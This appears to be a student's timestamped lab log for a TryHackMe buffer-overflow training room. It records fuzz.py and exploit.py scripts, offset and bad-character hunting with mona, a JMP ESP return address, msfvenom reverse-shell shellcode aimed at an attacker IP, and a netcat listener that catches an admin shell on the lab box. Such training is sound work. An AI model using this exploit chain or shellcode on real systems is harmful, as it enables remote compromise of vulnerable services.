```
Buffer Overflow prep
https://tryhackme.com/room/bufferoverflowprep
https://www.youtube.com/watch?v=skvjS4OX8cg
https://github.com/fredisanmar/OSCP-Buffer-Overflow
```

```
3:21 PM 1/28/2023
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.90.53 /workarea		
# in 2nd working window on kali
```

```
3:28 PM 1/28/2023
!mona config -set workingfolder c:\mona\%p								
# in immunity debugger
# clicked windows setting to go back to cpu mode
# hit play so program is running
```

```
3:31 PM 1/28/2023
┌──(root㉿kali)-[/home/kali]							# in window 1
└─# nc 10.10.90.53 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.					
```

```
3:32 PM 1/28/2023
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 fuzz.py   
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing crashed at 1800 bytes


# edited fuzz.py with code below and ran to find where the program crashed.

													#!/usr/bin/env python3

													import socket, time, sys

													ip = "10.10.90.53"

													port = 1337
													timeout = 5
													prefix = "OVERFLOW8 "

													string = prefix + "A" * 100

													while True:
													  try:
														with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
														  s.settimeout(timeout)
														  s.connect((ip, port))
														  s.recv(1024)
														  print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
														  s.send(bytes(string, "latin-1"))
														  s.recv(1024)
													  except:
														print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
														sys.exit(0)
													  string += 100 * "A"
													  time.sleep(1)
```

```
3:36 PM 1/28/2023
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]					
# since we know it crashed at 1800 now we generate payload of 1800 random characters to place into exploit.py under payload
└─# msf-pattern_create -l 1800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9


┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]										
# random 1800 string payload inserted in exploit.py
└─# gedit exploit.py

import socket

ip = "10.10.90.53"
port = 1337

prefix = "OVERFLOW8 "
offset = 0								# ensure 0 
overflow = "A" * offset
retn = ""								# ensure BBBB has not been entered yet
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

```
3:38 PM 1/28/2023																								# in window 2
CTRL F2 to reset
F9 to restart immunity debugger
```

```
3:39 PM 1/28/2023																								# sent over new payload in exploit.py
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 exploit.py                  
Sending evil buffer...
Done!
```

```
3:51 PM 1/28/2023					# NOW TO DETERMINE THE OFFSET TYPE COMMAND BELOW
!mona findmsp -distance 1800
```

```
3:51 PM 1/28/2023																		
# looking for text below to find offset always, which we did!
EIP contains normal pattern : 0x43346843 ( offset 1786 )
```

```
3:55 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:00 PM 1/28/2023																	# change exploit.py with new information we have  - #return with all B's to identify if it worked as well as the offset as 1786 - Also remove the payload from before
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# gedit exploit.py

														import socket

														ip = "10.10.90.53"
														port = 1337

														prefix = "OVERFLOW8 "
														offset = 1786
														overflow = "A" * offset
														retn = "BBBB"
														padding = ""
														payload = ""
														postfix = ""

														buffer = prefix + overflow + retn + padding + payload + postfix

														s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

														try:
														  s.connect((ip, port))
														  print("Sending evil buffer...")
														  s.send(bytes(buffer + "\r\n", "latin-1"))
														  print("Done!")
														except:
														  print("Could not connect.")
```
```
4:02 PM 1/28/2023														
# in window 2 we know it worked because "42424242" is diplayed which is all B's in HEX"
EIP	42424242
```

```
4:03 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:04 PM 1/28/2023														
# ran all_chars.py and got list of bad characters
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 all_chars.py 
	\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```
4:07 PM 1/28/2023																						# copy bad characters into payload of exploit.py
root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# gedit exploit.py

import socket

ip = "10.10.90.53"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

```   
4:08 PM 1/28/2023												# re-execute exploit.py
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 exploit.py  
Sending evil buffer...
Done!
```

```
4:10 PM 1/28/2023
# Going to use mona to determine bad characters using the comparare function to generate a byte array for all characters - this will generate bytearray.txt
# in immunity debugger, going to continuously update this command with more bad characters

!mona bytearray -b "\x00"	
```

```
4:12 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:14 PM 1/28/2023							# copying the ESP results to the notepad																								

0196FA30									# 1st ESP

!mona compare -f C:\mona\oscp\bytearray.bin -a 0196FA30									
# going to keep running this command to chase down the ESP stack point by appending the esp results

							mona Memory comparison results, item 0
							 Address=0x0196fa30
							 Status=Corruption after 28 bytes
							 BadChars=00 1d 1e 2e 2f c7 c8 ee ef						
							 # WE ALREADY put x00 into byte array as bad character so the next one we document is 1d
							 Type=normal
							 Location=Stack
```

```
4:19 PM 1/28/2023																		
# updating new byte array and put into mona 
!mona bytearray -b "\x00\x1d"
```

```
4:20 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:21 PM 1/28/2023
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]								
# ctrl f in gedit to take out x1d out of payload - save and re exploit.
└─# gedit exploit.py
```

```
4:24 PM 1/28/2023																	
# sending over new buffer
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 exploit.py
Sending evil buffer...
Done!
```

```
4:24 PM 1/28/2023
0198FA30									# 2nd ESP
```

```
4:31 PM 1/28/2023
!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30													# replacing mona command with 2nd esp

Bad Chars
00 1d 2e 2f c7 c8 ee ef																					# we see 2e is an additional bad character
```

```
4:33 PM 1/28/2023
!mona bytearray -b "\x00\x1d\x2e"																		# updating byte array with new bad character, enter into immunity debugger
```

```
4:34 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:35 PM 1/28/2023																						# remove 2e with ctrl f with gedit.
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# gedit exploit.py
```

```
4:36 PM 1/28/2023																						# resend buffer - rinse and repeat unitl it says unmodified meaning we got all the bad characters.
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 exploit.py
Sending evil buffer...
Done!
```

```
4:37 PM 1/28/2023
0199FA30									# 3rd stack pointer											# replacing mona command with 3rd esp
```

```
4:38 PM 1/28/2023
!mona compare -f C:\mona\oscp\bytearray.bin -a 0199FA30

Bad Chars
00 1d 2e c7 c8 ee ef																					# c7 is the additional bad character
```

```
4:39 PM 1/28/2023
!mona bytearray -b "\x00\x1d\x2e\xc7"																	# updating byte array with new bad character, enter into immunity debugger
```

```
4:40 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:40 PM 1/28/2023																						# remove c7 with ctrl f with gedit
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# gedit exploit.py
```

```
4:41 PM 1/28/2023
01A0FA30									#4th stack pointer
```

```
4:41 PM 1/28/2023
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30													# replacing mona command with 4th esp

BadChars
00 1d 2e c7 ee ef																						# ee is the additional bad character
```

```
4:43 PM 1/28/2023
!mona bytearray -b "\x00\x1d\x2e\xc7\xee"																# updating byte array with new bad character, enter into immunity debugger
```

```
4:44 PM 1/28/2023
CTRL F2 to reset
F9 to restart immunity debugger
```

```
4:45 PM 1/28/2023
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]													# removing xee from exploit.py with gedit
└─# gedit exploit.py
```

```
4:45 PM 1/28/2023
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 exploit.py
Sending evil buffer...
Done!
```

```
4:46 PM 1/28/2023
018BFA30									# 5th stack pointer
```

```
4:46 PM 1/28/2023
!mona compare -f C:\mona\oscp\bytearray.bin -a 018BFA30													# hit the Unmodified status
```

```
4:49 PM 1/28/2023
!mona jmp -r esp -cpb "\x00\x1d\x2e\xc7\xee"															# now we need to find a valid jump esp that we can use in this program by running this coomand. And pass it all bad characters we found.

	# once entered click on window -> log data to find jmp esp under results -!!!! have to make sure that the jmp esp is false under ASLR/REBASE/SAFE/ETC #
	
	 Address=625011AF
	 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

\xAF\x11\x50\x62																	# Have to Make return address in little Endian and put into exploit.py

```

```
4:56 PM 1/28/2023
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.13.125 LPORT=443 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f c				# making reverse shell with bad characters included in c format

"\xba\x6a\x2d\x7a\x9a\xdb\xd7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"																	# put into exploit.py under payload
"\x52\x31\x50\x12\x83\xc0\x04\x03\x3a\x23\x98\x6f\x46\xd3\xde"
"\x90\xb6\x24\xbf\x19\x53\x15\xff\x7e\x10\x06\xcf\xf5\x74\xab"
"\xa4\x58\x6c\x38\xc8\x74\x83\x89\x67\xa3\xaa\x0a\xdb\x97\xad"
"\x88\x26\xc4\x0d\xb0\xe8\x19\x4c\xf5\x15\xd3\x1c\xae\x52\x46"
"\xb0\xdb\x2f\x5b\x3b\x97\xbe\xdb\xd8\x60\xc0\xca\x4f\xfa\x9b"
"\xcc\x6e\x2f\x90\x44\x68\x2c\x9d\x1f\x03\x86\x69\x9e\xc5\xd6"
"\x92\x0d\x28\xd7\x60\x4f\x6d\xd0\x9a\x3a\x87\x22\x26\x3d\x5c"
"\x58\xfc\xc8\x46\xfa\x77\x6a\xa2\xfa\x54\xed\x21\xf0\x11\x79"
"\x6d\x15\xa7\xae\x06\x21\x2c\x51\xc8\xa3\x76\x76\xcc\xe8\x2d"
"\x17\x55\x55\x83\x28\x85\x36\x7c\x8d\xce\xdb\x69\xbc\x8d\xb3"
"\x5e\x8d\x2d\x44\xc9\x86\x5e\x76\x56\x3d\xc8\x3a\x1f\x9b\x0f"
"\x3c\x0a\x5b\x9f\xc3\xb5\x9c\xb6\x07\xe1\xcc\xa0\xae\x8a\x86"
"\x30\x4e\x5f\x08\x60\xe0\x30\xe9\xd0\x40\xe1\x81\x3a\x4f\xde"
"\xb2\x45\x85\x77\x58\xbc\x4e\x72\x90\xb3\xf3\xea\xa8\xcb\x0a"
"\x50\x25\x2d\x66\xb6\x60\xe6\x1f\x2f\x29\x7c\x81\xb0\xe7\xf9"
"\x81\x3b\x04\xfe\x4c\xcc\x61\xec\x39\x3c\x3c\x4e\xef\x43\xea"
"\xe6\x73\xd1\x71\xf6\xfa\xca\x2d\xa1\xab\x3d\x24\x27\x46\x67"
"\x9e\x55\x9b\xf1\xd9\xdd\x40\xc2\xe4\xdc\x05\x7e\xc3\xce\xd3"
"\x7f\x4f\xba\x8b\x29\x19\x14\x6a\x80\xeb\xce\x24\x7f\xa2\x86"
"\xb1\xb3\x75\xd0\xbd\x99\x03\x3c\x0f\x74\x52\x43\xa0\x10\x52"
"\x3c\xdc\x80\x9d\x97\x64\xa0\x7f\x3d\x91\x49\x26\xd4\x18\x14"
"\xd9\x03\x5e\x21\x5a\xa1\x1f\xd6\x42\xc0\x1a\x92\xc4\x39\x57"
"\x8b\xa0\x3d\xc4\xac\xe0"
```

```
5:00 PM 1/28/2023																													# new exploit.py with shell code/bad characters/offset/little endian return address/ noop shell code
import socket

ip = "10.10.90.53"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16																																	# x90 is the no op sled, good practice to have 16 of them so code doesnt stumble
payload = ("\xba\x6a\x2d\x7a\x9a\xdb\xd7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"					
"\x52\x31\x50\x12\x83\xc0\x04\x03\x3a\x23\x98\x6f\x46\xd3\xde"
"\x90\xb6\x24\xbf\x19\x53\x15\xff\x7e\x10\x06\xcf\xf5\x74\xab"
"\xa4\x58\x6c\x38\xc8\x74\x83\x89\x67\xa3\xaa\x0a\xdb\x97\xad"
"\x88\x26\xc4\x0d\xb0\xe8\x19\x4c\xf5\x15\xd3\x1c\xae\x52\x46"
"\xb0\xdb\x2f\x5b\x3b\x97\xbe\xdb\xd8\x60\xc0\xca\x4f\xfa\x9b"
"\xcc\x6e\x2f\x90\x44\x68\x2c\x9d\x1f\x03\x86\x69\x9e\xc5\xd6"
"\x92\x0d\x28\xd7\x60\x4f\x6d\xd0\x9a\x3a\x87\x22\x26\x3d\x5c"
"\x58\xfc\xc8\x46\xfa\x77\x6a\xa2\xfa\x54\xed\x21\xf0\x11\x79"
"\x6d\x15\xa7\xae\x06\x21\x2c\x51\xc8\xa3\x76\x76\xcc\xe8\x2d"
"\x17\x55\x55\x83\x28\x85\x36\x7c\x8d\xce\xdb\x69\xbc\x8d\xb3"
"\x5e\x8d\x2d\x44\xc9\x86\x5e\x76\x56\x3d\xc8\x3a\x1f\x9b\x0f"
"\x3c\x0a\x5b\x9f\xc3\xb5\x9c\xb6\x07\xe1\xcc\xa0\xae\x8a\x86"
"\x30\x4e\x5f\x08\x60\xe0\x30\xe9\xd0\x40\xe1\x81\x3a\x4f\xde"
"\xb2\x45\x85\x77\x58\xbc\x4e\x72\x90\xb3\xf3\xea\xa8\xcb\x0a"
"\x50\x25\x2d\x66\xb6\x60\xe6\x1f\x2f\x29\x7c\x81\xb0\xe7\xf9"
"\x81\x3b\x04\xfe\x4c\xcc\x61\xec\x39\x3c\x3c\x4e\xef\x43\xea"
"\xe6\x73\xd1\x71\xf6\xfa\xca\x2d\xa1\xab\x3d\x24\x27\x46\x67"
"\x9e\x55\x9b\xf1\xd9\xdd\x40\xc2\xe4\xdc\x05\x7e\xc3\xce\xd3"
"\x7f\x4f\xba\x8b\x29\x19\x14\x6a\x80\xeb\xce\x24\x7f\xa2\x86"
"\xb1\xb3\x75\xd0\xbd\x99\x03\x3c\x0f\x74\x52\x43\xa0\x10\x52"
"\x3c\xdc\x80\x9d\x97\x64\xa0\x7f\x3d\x91\x49\x26\xd4\x18\x14"
"\xd9\x03\x5e\x21\x5a\xa1\x1f\xd6\x42\xc0\x1a\x92\xc4\x39\x57"
"\x8b\xa0\x3d\xc4\xac\xe0")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

```  
5:03 PM 1/28/2023
CTRL F2 to reset												
# in window 2
F9 to restart immunity debugger
```

```
5:05 PM 1/28/2023												# setup nc listener
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 443                                                                                        
listening on [any] 443 ...
```

```
5:05 PM 1/28/2023														
# took a while to work.	
┌──(root㉿kali)-[/home/kali/Documents/bufferoverflow]
└─# python3 exploit.py
Sending evil buffer...
Done!
```

```
5:06 PM 1/28/2023																
# buffer overflow worked, on box as admin!
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 443                                                                                        
listening on [any] 443 ...
connect to [10.13.13.125] from (UNKNOWN) [10.10.90.53] 49274
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```


